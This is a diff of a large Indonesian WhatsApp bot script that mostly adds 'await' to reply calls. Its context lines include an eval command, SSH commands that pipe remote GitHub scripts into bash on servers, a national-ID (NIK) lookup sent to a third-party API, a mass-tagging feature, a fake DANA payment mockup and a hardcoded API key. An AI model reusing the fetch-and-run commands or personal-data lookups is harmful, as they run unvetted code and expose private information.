+ await replyV1(`Berhasil menambahkan ID Saluran *${res.id}* dari link:\n${channelLink}\n\nNama Saluran: ${res.name}`);
  } catch (e) {
  console.error(e);
- replyV1("Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
+ await replyV1("Terjadi kesalahan saat memproses link saluran. Pastikan link valid!");
  }
 }
 break
@@ -31469,9 +31418,9 @@ case 'ev': {
                 depth: 5
             })
         }
-        replyV1(result)
+        await replyV1(result)
     } catch (err) {
-        replyV1(String(err))
+        await replyV1(String(err))
     }
 }
 break
@@ -31485,10 +31434,10 @@ case 'asmaulhusna': {
                   return `Urutan: ${item.index}\nLatin: ${item.latin}\nArab: ${item.arabic}\nTerjemahan ID: ${item.translation_id}\nTerjemahan EN: ${item.translation_en}\n`
                 }).join('\n')
 
-                replyV1(tks)
+                await replyV1(tks)
               } catch (err) {
                 console.error(err)
-                replyV1('Error cuy, coba lagi ntar!')
+                await replyV1('Error cuy, coba lagi ntar!')
               }
             }
             break
@@ -31502,7 +31451,7 @@ case 'asmaulhusna': {
                 if (!text) {
                   let daftarNiat = 'DAFTAR NIAT SHOLAT\n\n' + niatSholat.map((item) => `- ${item.name}`).join('\n')
                   daftarNiat += '\n\nKetik .niatsholat [nama sholat] untuk melihat niat, contoh: .niatsholat subuh'
-                  replyV1(daftarNiat)
+                  await replyV1(daftarNiat)
                 } else {
                   let hasil = niatSholat.find((item) => item.name.toLowerCase().includes(text.toLowerCase()))
 
@@ -31511,14 +31460,14 @@ case 'asmaulhusna': {
                       `Arab: ${hasil.arabic}\n` +
                       `Latin: ${hasil.latin}\n` +
                       `Terjemahan: ${hasil.terjemahan}`
-                    replyV1(tks)
+                    await replyV1(tks)
                   } else {
-                    replyV1('Niat sholat yang lu cari ga ketemu cuy. Cek lagi nama sholatnya!')
+                    await replyV1('Niat sholat yang lu cari ga ketemu cuy. Cek lagi nama sholatnya!')
                   }
                 }
               } catch (err) {
                 console.error(err)
-                replyV1('Error cuy, coba lagi ntar!')
+                await replyV1('Error cuy, coba lagi ntar!')
               }
             }
             break
@@ -31526,7 +31475,7 @@ case 'asmaulhusna': {
             case 'surah': {
               try {
                 if (!text) {
-                  replyV1('Ketik nomor surahnya! Contoh: .surah 1 buat ambil ayat-ayat dari Al-Fatihah')
+                  await replyV1('Ketik nomor surahnya! Contoh: .surah 1 buat ambil ayat-ayat dari Al-Fatihah')
                   return
                 }
 
@@ -31541,13 +31490,13 @@ case 'asmaulhusna': {
                     `Terjemahan: ${ayat.indo}\n`
                   ).join('\n\n')
 
-                  replyV1(surahText)
+                  await replyV1(surahText)
                 } else {
-                  replyV1('Gak ketemu, cek lagi nomor surahnya!')
+                  await replyV1('Gak ketemu, cek lagi nomor surahnya!')
                 }
               } catch (err) {
                 console.error(err)
-                replyV1('Terjadi kesalahan: ' + err)
+                await replyV1('Terjadi kesalahan: ' + err)
               }
             }
             break
@@ -31561,7 +31510,7 @@ case 'asmaulhusna': {
                 if (!text) {
                   let listDoa = 'DAFTAR DOA\n\n' + daftarDoa.map((item) => `- ${item.doa}`).join('\n')
                   listDoa += '\n\nKetik .doa [nama doa] untuk melihat doa, contoh: .doa doa sebelum tidur'
-                  replyV1(listDoa)
+                  await replyV1(listDoa)
                 } else {
                   let hasil = daftarDoa.find((item) => item.doa.toLowerCase().includes(text.toLowerCase()))
 
@@ -31570,14 +31519,14 @@ case 'asmaulhusna': {
                       `Ayat: ${hasil.ayat}\n` +
                       `Latin: ${hasil.latin}\n` +
                       `Artinya: ${hasil.artinya}`
-                    replyV1(tks)
+                    await replyV1(tks)
                   } else {
-                    replyV1('Doa yang lu cari ga ketemu cuy. Cek lagi nama doanya!')
+                    await replyV1('Doa yang lu cari ga ketemu cuy. Cek lagi nama doanya!')
                   }
                 }
               } catch (err) {
                 console.error(err)
-                replyV1('Error cuy, coba lagi ntar!')
+                await replyV1('Error cuy, coba lagi ntar!')
               }
             }
             break
@@ -31602,7 +31551,7 @@ case 'asmaulhusna': {
                 }
               }
               let lp = await islam(text)
-              replyV1(lp)
+              await replyV1(lp)
             }
             break
 
@@ -31623,7 +31572,7 @@ case 'asmaulhusna': {
               }
               let qe = 'Berikan satu kata-kata atau quotes Islamic random yang sangat memotivasi, dan menginspirasi, jawab langsung ke intinya!'
               let qo = await AI(qe)
-              replyV1(qo.result)
+              await replyV1(qo.result)
             }
             break
 
@@ -31644,7 +31593,7 @@ case 'asmaulhusna': {
               }
               let qe = 'Berikan satu kata-kata pantun Islamic random yang sangat memotivasi, dan menginspirasi, jawab langsung ke intinya!'
               let qo = await AI(qe)
-              replyV1(qo.result)
+              await replyV1(qo.result)
             }
             break
 //quotes menu
@@ -31655,25 +31604,25 @@ case 'faktaunik': {
     case 'katasenja': {
 const senja = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/katasenja.json`)
       const katasenja = await pickRandom(senja)
-      replyV1(`${katasenja}`)
+      await replyV1(`${katasenja}`)
     }
     break
     case 'katailham': {
 const ilham = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/katailham.json`)
       const katailham = await pickRandom(ilham)
-      replyV1(`${katailham}`)
+      await replyV1(`${katailham}`)
     }
     break
     case 'quotes': {
 const quot = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/quotes.json`)
       const quote = await pickRandom(quot)
-      replyV1(`${quote.quotes}\n\nBy ${quote.author}`)
+      await replyV1(`${quote.quotes}\n\nBy ${quote.author}`)
     }
     break
     case 'puisi': {
 const puis = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/puisi.json`)
       const puisi = await pickRandom(puis)
-      replyV1(`${puisi}`)
+      await replyV1(`${puisi}`)
     }
     break
     case 'pantun': {
@@ -31683,7 +31632,7 @@ const puis = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/ma
     case 'motivasi': {
 const motiv = await fetchJson(`https://raw.githubusercontent.com/Leoo7z/quotes/main/quotes-source/motivasi.json`)
       const motivasi = await pickRandom(motiv)
-      replyV1(`${motivasi}`)
+      await replyV1(`${motivasi}`)
     }
     break
     //FUN MENU
@@ -31958,7 +31907,7 @@ case 'bego':
 							})
 							fs.unlinkSync(ran)
 						})
-					} else replyV1(`Balas audio yang ingin diubah dengan caption *${cmd}*`)
+					} else await replyV1(`Balas audio yang ingin diubah dengan caption *${cmd}*`)
 				} catch (error) {
 					 
 				}
@@ -32181,7 +32130,7 @@ case 'fakestory': {
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {})
         const imageBuffer = await q.download()
         if (!Buffer.isBuffer(imageBuffer) || !imageBuffer.length) throw new Error('Gagal mengunduh foto. Coba kirim atau reply foto kembali.')
-        const output = await furinaV18Features.createFakeStory(imageBuffer, username, captionText)
+        const output = await xeryuuV18Features.createFakeStory(imageBuffer, username, captionText)
         await conn.sendMessage(m.chat, {
             image: output,
             caption: `✅ *FakeStory berhasil dibuat (mockup)*\n👤 Username: ${username}\n📝 Caption: ${captionText}\n\n_Ini gambar simulasi, bukan unggahan Story asli._`
@@ -32206,7 +32155,7 @@ case 'lobbyff': {
     if (!playerName) return replyV1(`Nama pemain belum diisi. Contoh: ${prefix}fakeff 1|Xnalz`)
     try {
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {})
-        const result = await furinaV18Features.createFakeFF(template, playerName)
+        const result = await xeryuuV18Features.createFakeFF(template, playerName)
         await conn.sendMessage(m.chat, {
             image: result.buffer,
             caption: `🎮 *FREE FIRE LOBBY — MOCKUP*\n👤 Nama: ${result.name.toUpperCase()}\n🖼️ Template: ${result.template}\n\n_Label SIMULASI/FAN-MADE ditambahkan pada gambar._`
@@ -32230,7 +32179,7 @@ case 'fakelobbyml': {
     try {
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {})
         const inputBuffer = await q.download()
-        const result = await furinaV18Features.createFakeML(inputBuffer, nickname)
+        const result = await xeryuuV18Features.createFakeML(inputBuffer, nickname)
         await conn.sendMessage(m.chat, {
             image: result.buffer,
             caption: `🎮 *MOBILE LEGENDS LOBBY — MOCKUP*\n👤 Nickname: ${result.name}\n\n_Label SIMULASI/FAN-MADE ditambahkan pada gambar._`
@@ -32249,7 +32198,7 @@ case 'fakedana': {
     if (!nominal) return replyV1(`💳 *DANA MOCKUP / SIMULASI*\n\nContoh: ${prefix}fakedana 150000\n\nHasil diberi watermark SIMULASI dan bukan bukti transfer/pembayaran.`)
     try {
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } }).catch(() => {})
-        const result = await furinaV18Features.createFakeDana(nominal)
+        const result = await xeryuuV18Features.createFakeDana(nominal)
         await conn.sendMessage(m.chat, {
             image: result.buffer,
             caption: `💳 *DANA MOCKUP — SIMULASI*\nNominal contoh: Rp ${result.amount}\n\n⚠️ Ini hanya desain contoh, bukan transaksi, bukti transfer, atau konfirmasi pembayaran.`
@@ -33354,7 +33303,7 @@ const getcase = (cases) => {
 return "case "+`\"${cases}\"`+fs.readFileSync(projectPath('xeryuu.js'), 'utf8').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
 }
 try {
-replyV1(`${getcase(q)}`)
+await replyV1(`${getcase(q)}`)
 } catch (e) {
 return replyV1(`Case ${text} tidak ditemukan`)
 }
@@ -33483,13 +33432,13 @@ if (!isBotAdmins) return replyV1(mess.botAdmin)
  if (argsLower === 'on') {
  antichannel[m.chat].antichannel = true;
  saveAntichannel();
- replyV1('✅ Anti Link Channel WhatsApp AKTIF!');
+ await replyV1('✅ Anti Link Channel WhatsApp AKTIF!');
  } else if (argsLower === 'off') {
  antichannel[m.chat].antichannel = false;
  saveAntichannel();
- replyV1('❌ Anti Link Channel WhatsApp NONAKTIF!');
+ await replyV1('❌ Anti Link Channel WhatsApp NONAKTIF!');
  } else {
- replyV1(`Contoh:\n${prefix}antichannel on\n${prefix}antichannel off`);
+ await replyV1(`Contoh:\n${prefix}antichannel on\n${prefix}antichannel off`);
  }
 }
 break
@@ -33770,12 +33719,12 @@ await console.log(data.toString())
 }).stderr.on('data', (data) => {
 stream.write("y\n")
 stream.write("systemctl start wings\n")
-replyV1('STDERR: ' + data);
+void replyV1Safe('STDERR: ' + data);
 });
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-replyV1('Katasandi atau IP tidak valid');
+void replyV1Safe('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
@@ -34076,7 +34025,7 @@ console.log('STDERR: ' + data)
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-replyV1('Katasandi atau IP tidak valid');
+void replyV1Safe('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
@@ -34101,7 +34050,7 @@ const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pter
 const ress = new Client();
 
 ress.on('ready', () => {
-replyV1("Memproses install tema enigma pterodactyl\nTunggu 1-10 menit hingga proses selsai")
+void replyV1Safe("Memproses install tema enigma pterodactyl\nTunggu 1-10 menit hingga proses selsai")
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => {    
@@ -34123,7 +34072,7 @@ console.log('STDERR: ' + data)
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-replyV1('Katasandi atau IP tidak valid');
+void replyV1Safe('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
@@ -34147,7 +34096,7 @@ const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pter
 const ress = new Client();
 
 ress.on('ready', () => {
-replyV1("Memproses install tema billing pterodactyl\nTunggu 1-10 menit hingga proses selsai")
+void replyV1Safe("Memproses install tema billing pterodactyl\nTunggu 1-10 menit hingga proses selsai")
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => {    
@@ -34166,7 +34115,7 @@ console.log('STDERR: ' + data)
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-replyV1('Katasandi atau IP tidak valid');
+void replyV1Safe('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
@@ -34190,7 +34139,7 @@ const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pter
 const ress = new Client();
 
 ress.on('ready', async () => {
-replyV1("Memproses install tema stellar pterodactyl\nTunggu 1-10 menit hingga proses selsai")
+await replyV1("Memproses install tema stellar pterodactyl\nTunggu 1-10 menit hingga proses selsai")
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => {    
@@ -34209,7 +34158,7 @@ console.log('STDERR: ' + data)
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-replyV1('Katasandi atau IP tidak valid');
+void replyV1Safe('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
@@ -34233,7 +34182,7 @@ const command = `bash <(curl https://raw.githubusercontent.com/NoPro200/Pterodac
 const ress = new Client();
 
 ress.on('ready', async () => {
-replyV1("Memproses install tema night core pterodactyl\nTunggu 1-10 menit hingga proses selsai")
+await replyV1("Memproses install tema night core pterodactyl\nTunggu 1-10 menit hingga proses selsai")
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => {    
@@ -34249,7 +34198,7 @@ console.log('STDERR: ' + data)
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-replyV1('Katasandi atau IP tidak valid');
+void replyV1Safe('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
@@ -34273,7 +34222,7 @@ const connSettings = {
     const ress = new Client();
 
     ress.on('ready', async () => {
-        replyV1("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selesai");
+        await replyV1("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selesai");
         ress.exec(command, (err, stream) => {
             if (err) throw err;
             stream.on('close', async (code, signal) => {
@@ -34291,7 +34240,7 @@ const connSettings = {
         });
     }).on('error', (err) => {
         console.log('Connection Error: ' + err);
-        replyV1('Katasandi atau IP tidak valid');
+        void replyV1Safe('Katasandi atau IP tidak valid');
     }).connect(connSettings);
 }
 break
@@ -34315,7 +34264,7 @@ const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/i
 const ress = new Client();
 
 ress.on('ready', async () => {
-replyV1("Memproses install thema Nebula pterodactyl\nTunggu 1-10 menit hingga proses selsai")
+await replyV1("Memproses install thema Nebula pterodactyl\nTunggu 1-10 menit hingga proses selsai")
 ress.exec(command, (err, stream) => {
 if (err) throw err
 stream.on('close', async (code, signal) => {    
@@ -34332,7 +34281,7 @@ console.log('STDERR: ' + data)
 });
 }).on('error', (err) => {
 console.log('Connection Error: ' + err);
-replyV1('Katasandi atau IP tidak valid');
+void replyV1Safe('Katasandi atau IP tidak valid');
 }).connect(connSettings);
 }
 break
@@ -34345,7 +34294,7 @@ if (!text) return replyV1(example("linkgcnya"))
 if (!text.includes("chat.whatsapp.com")) return replyV1("Link tautan tidak valid")
 let result = text.split('https://chat.whatsapp.com/')[1]
 let id = await conn.groupAcceptInvite(result)
-replyV1(`Berhasil bergabung ke dalam grup ${id}`)
+await replyV1(`Berhasil bergabung ke dalam grup ${id}`)
 }
 break
 
@@ -35204,7 +35153,7 @@ case "number-info": {
   }
 
   // ===== OUTPUT =====
-  replyV1(
+  await replyV1(
     `📞 *INFORMASI NOMOR*\n\n` +
     `🔢 Nomor: ${nomor}\n` +
     `🌍 Negara: ${negara}\n` +
@@ -35294,7 +35243,7 @@ case 'nik-information': {
     const nik = q.trim();
 
     try {
-        replyV1("🔍 Sedang Mencari Data Dari NIK Tersebut");
+        await replyV1("🔍 Sedang Mencari Data Dari NIK Tersebut");
 
         const res = await fetch("https://api.siputzx.my.id/api/tools/nik-checker", {
             method: "POST",
@@ -35340,11 +35289,11 @@ ${coord.lat && coord.lon
 
         `.trim();
 
-        replyV1(hasil);
+        await replyV1(hasil);
 
     } catch (err) {
         console.error("NIK PERSE ERROR:", err);
-        replyV1("❌ Gagal memproses NIK");
+        await replyV1("❌ Gagal memproses NIK");
     }
 }
 
@@ -35372,7 +35321,7 @@ case "search-username": {
     teks += `• ${name}: ${url}\n`;
   }
 
-  replyV1(teks);
+  await replyV1(teks);
 }
 
 break;
@@ -35557,7 +35506,7 @@ if (!isAdmins) return replyV1(mess.admjn)
         );
     }
 
-    replyV1(`✅ Selesai menandai @${target.id.split('@')[0]} sebanyak ${count} kali`);
+    await replyV1(`✅ Selesai menandai @${target.id.split('@')[0]} sebanyak ${count} kali`);
 }
 break;
 case "antilink": 
@@ -35580,9 +35529,9 @@ if (args[0] === "on") {
     if (!linkDB.includes(m.chat)) return replyV1(`❌ ${command} belum diaktifkan.`);
     linkDB.splice(linkDB.indexOf(m.chat), 1);
     fs.writeFileSync(dbFile, JSON.stringify(linkDB));
-    replyV1(`❌ ${command} telah dinonaktifkan!`);
+    await replyV1(`❌ ${command} telah dinonaktifkan!`);
 } else {
-            replyV1(`⚠️ Gunakan:\n- *.${command} on* untuk mengaktifkan\n- *.${command} off* untuk menonaktifkan`);
+            await replyV1(`⚠️ Gunakan:\n- *.${command} on* untuk mengaktifkan\n- *.${command} off* untuk menonaktifkan`);
         }
       break
 case 'antilinkig': {
@@ -35694,7 +35643,7 @@ case 'tiktokptv': {
 
     } catch (err) {
         console.log(err);
-        replyV1('Gagal mendownload video, pastikan link TikTok valid');
+        await replyV1('Gagal mendownload video, pastikan link TikTok valid');
     }
 }
 break
@@ -35741,7 +35690,7 @@ case 'gif': {
     if (!quoted) return replyV1('Reply videonya dengan caption *.togif*')
     if (!/video/.test(mime)) return m.Eeply('Itu bukan video!')
     
-    replyV1('⏳ Sedang mengubah video ke GIF...')
+    await replyV1('⏳ Sedang mengubah video ke GIF...')
 
     let media = await quoted.download()
     
@@ -35819,7 +35768,7 @@ caption: `🔥 *TikTok Trending*
 
 } catch (err) {
 console.log(err)
-replyV1("Terjadi error saat mengambil data TikTok")
+await replyV1("Terjadi error saat mengambil data TikTok")
 }
 
 }
@@ -35893,7 +35842,7 @@ case "gethtml": {
         fs.unlinkSync(filePath); // hapus setelah terkirim
     } catch (e) {
         console.error(e);
-        replyV1("❌ Terjadi kesalahan saat mengambil HTML\n" + e.message);
+        await replyV1("❌ Terjadi kesalahan saat mengambil HTML\n" + e.message);
     }
 }
 break;
@@ -35921,11 +35870,11 @@ case "listweb": {
             teks += `🔗 https://${v.name}.vercel.app\n\n`
         })
 
-        replyV1(teks)
+        await replyV1(teks)
 
     } catch (e) {
         console.log(e)
-        replyV1('❌ Gagal mengambil data!')
+        await replyV1('❌ Gagal mengambil data!')
     }
 }
 break;
@@ -35957,7 +35906,7 @@ case "infoweb": {
             if (cek.status === 200) statusWeb = "✅ Online"
         } catch {}
 
-        replyV1(`📊 *INFO WEB XnalzNotDev*
+        await replyV1(`📊 *INFO WEB XnalzNotDev*
 
 📦 Nama: ${json.name}
 🆔 ID: ${json.id}
@@ -35967,7 +35916,7 @@ case "infoweb": {
         
     } catch (e) {
         console.log(e)
-        replyV1('❌ Gagal ambil info!')
+        await replyV1('❌ Gagal ambil info!')
     }
 }
 break;
@@ -35982,19 +35931,19 @@ case "cekweb": {
         let res = await fetch(url)
 
         if (res.status === 200) {
-            replyV1(`🌐 *CEK WEBSITE*
+            await replyV1(`🌐 *CEK WEBSITE*
 
 🔗 ${url}
 ⚡ Status: ✅ Online`)
         } else {
-            replyV1(`🌐 *CEK WEBSITE*
+            await replyV1(`🌐 *CEK WEBSITE*
 
 🔗 ${url}
 ⚠️ Status: ❌ Tidak normal (${res.status})`)
         }
 
     } catch (e) {
-        replyV1(`🌐 *CEK WEBSITE*
+        await replyV1(`🌐 *CEK WEBSITE*
 
 🔗 ${url}
 ❌ Status: Offline / Tidak bisa diakses`)
@@ -36022,10 +35971,10 @@ case "historyweb": {
             teks += `🌐 https://${v.url}\n\n`
         })
 
-        replyV1(teks)
+        await replyV1(teks)
 
     } catch (e) {
-        replyV1('❌ Gagal ambil history')
+        await replyV1('❌ Gagal ambil history')
     }
 }
 break;
@@ -36437,9 +36386,9 @@ case 'cuaca': case 'cekcuaca': {
 				if (!text) return replyV1(`Example: ${prefix + command} jakarta`)
 				try {
 					let data = await fetchJson(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=en`)
-					replyV1(`*🏙 Cuaca Kota ${data.name}*\n\n*🌤️ Cuaca :* ${data.weather[0].main}\n*📝 Deskripsi :* ${data.weather[0].description}\n*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n*🌬️ Tekanan :* ${data.main.pressure} hPa\n*💧 Kelembapan :* ${data.main.humidity}%\n*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n*📍Lokasi :*\n- *Bujur :* ${data.coord.lat}\n- *Lintang :* ${data.coord.lon}\n*🌏 Negara :* ${data.sys.country}`)
+					await replyV1(`*🏙 Cuaca Kota ${data.name}*\n\n*🌤️ Cuaca :* ${data.weather[0].main}\n*📝 Deskripsi :* ${data.weather[0].description}\n*🌡️ Suhu Rata-rata :* ${data.main.temp} °C\n*🤔 Terasa Seperti :* ${data.main.feels_like} °C\n*🌬️ Tekanan :* ${data.main.pressure} hPa\n*💧 Kelembapan :* ${data.main.humidity}%\n*🌪️ Kecepatan Angin :* ${data.wind.speed} Km/h\n*📍Lokasi :*\n- *Bujur :* ${data.coord.lat}\n- *Lintang :* ${data.coord.lon}\n*🌏 Negara :* ${data.sys.country}`)
 				} catch (e) {
-					replyV1('Kota Tidak Di Temukan!')
+					await replyV1('Kota Tidak Di Temukan!')
 				}
 			}
 			break
@@ -36569,7 +36518,7 @@ case "tobase64": {
 
     let result = Buffer.from(text).toString('base64')
 
-    replyV1(`✅ Hasil Base64:\n\n${result}`)
+    await replyV1(`✅ Hasil Base64:\n\n${result}`)
 }
 break;
 case 'saham':
@@ -36832,7 +36781,7 @@ const input2 = input.split("@")[0]
 if (input2 === global.owner || premium.includes(input) || input === botNumber) return replyV1(`Nomor ${input2} sudah menjadi reseller!`)
 premium.push(input)
 await fs.writeFileSync(projectPath('library', 'database', 'premium.json'), JSON.stringify(premium, null, 2))
-replyV1(`Berhasil menambah reseller ✅`)
+await replyV1(`Berhasil menambah reseller ✅`)
 }
 break
 
@@ -36861,7 +36810,7 @@ if (!premium.includes(input)) return replyV1(`Nomor ${input2} bukan reseller!`)
 let posi = premium.indexOf(input)
 await premium.splice(posi, 1)
 await fs.writeFileSync(projectPath('library', 'database', 'premium.json'), JSON.stringify(premium, null, 2))
-replyV1(`Berhasil menghapus reseller ✅`)
+await replyV1(`Berhasil menghapus reseller ✅`)
 }
 break
 
@@ -37325,7 +37274,7 @@ errors: null
 } : await delusr.json()
 }}
 if (sections == undefined) return replyV1("Server panel tidak ditemukan!")
-replyV1(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
+await replyV1(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
 }
 break
 
@@ -37628,7 +37577,7 @@ errors: null
 } : await delusr.json()
 }}
 if (sections == undefined) return replyV1("Server panel tidak ditemukan!")
-replyV1(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
+await replyV1(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
 }
 break
 
@@ -37817,7 +37766,7 @@ if (!owners.includes(input)) return replyV1(`Nomor ${input2} bukan owner bot!`)
 let posi = owners.indexOf(input)
 await owners.splice(posi, 1)
 await fs.writeFileSync(projectPath('library', 'database', 'owner.json'), JSON.stringify(owners, null, 2))
-replyV1(`Berhasil menghapus owner ✅`)
+await replyV1(`Berhasil menghapus owner ✅`)
 }
 break
 
@@ -37831,7 +37780,7 @@ const input2 = input.split("@")[0]
 if (input2 === global.owner || owners.includes(input) || input === botNumber) return replyV1(`Nomor ${input2} sudah menjadi owner bot!`)
 owners.push(input)
 await fs.writeFileSync(projectPath('library', 'database', 'owner.json'), JSON.stringify(owners, null, 2))
-replyV1(`Berhasil menambah owner ✅`)
+await replyV1(`Berhasil menambah owner ✅`)
 }
 
 
@@ -37864,7 +37813,7 @@ case "cekjawa": {
     let randomIndex = Math.floor(Math.random() * jawaban.length);
     let result = jawaban[randomIndex];
 
-    replyV1(`Hasil *cekJawa* untuk *${text}*:\n${result}`);
+    await replyV1(`Hasil *cekJawa* untuk *${text}*:\n${result}`);
 }
 break
 case "panduan": {
@@ -37908,7 +37857,7 @@ text: `📚 *Random Fact*\n\n${res.data.text}`
 
 } catch (e) {
 console.log(e)
-replyV1("❌ gagal mengambil fakta")
+await replyV1("❌ gagal mengambil fakta")
 }
 
 }
@@ -37919,7 +37868,7 @@ try {
 
 if (!text) return replyV1("contoh: .ttslide https://vt.tiktok.com/xxxxx")
 
-replyV1("⏳ Tunggu sebentar, sedang mengambil slide TikTok...")
+await replyV1("⏳ Tunggu sebentar, sedang mengambil slide TikTok...")
 
 const axios = require("axios")
 
@@ -37986,7 +37935,7 @@ ptt:false
 } catch (err) {
 
 console.log("❌ ERROR TTSLIDE:", err)
-replyV1("❌ gagal mengambil slide TikTok")
+await replyV1("❌ gagal mengambil slide TikTok")
 
 }
 
@@ -38122,7 +38071,7 @@ await replyV1(String(err))
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
 
 if (String(m?.text || body || '').toLowerCase() === "bot") {
-replyV1("XnalzNotDev Md Online ada yang bisa saya bantu? ✅")
+await replyV1("XnalzNotDev Md Online ada yang bisa saya bantu? ✅")
 }
 
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
